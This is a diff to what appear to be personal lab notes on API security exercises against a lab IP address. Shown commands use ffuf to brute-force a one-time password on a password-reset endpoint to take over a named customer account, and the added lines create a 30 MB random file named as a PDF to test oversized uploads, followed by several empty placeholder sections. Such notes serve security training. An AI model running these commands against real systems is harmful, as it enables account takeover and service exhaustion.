@@ -70,6 +70,21 @@ ffuf -w tokens.txt:EMAIL -X 'POST'  -u 'http://94.237.120.233:56026/api/v1/authe
 ffuf -w tokens.txt:EMAIL -X 'POST'  -u 'http://94.237.120.233:56026/api/v1/authentication/customers/passwords/resets' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{ "Email": "MasonJenkins@ymail.com", "OTP": "EMAIL", "NewPassword": "hola123" }'  -t 100 -fs 23 
 ```
 
-# Broken Object Property Level Authorization
+# Unrestricted Resource Consumption
+```bash
+#Create a Random pdf with big mb
+dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
+```
+
+# Unrestricted Resource Consumption
 ```bash
 ```
+
+# Unrestricted Resource Consumption
+```bash
+```
+
+# Unrestricted Resource Consumption
+```bash
+```
+
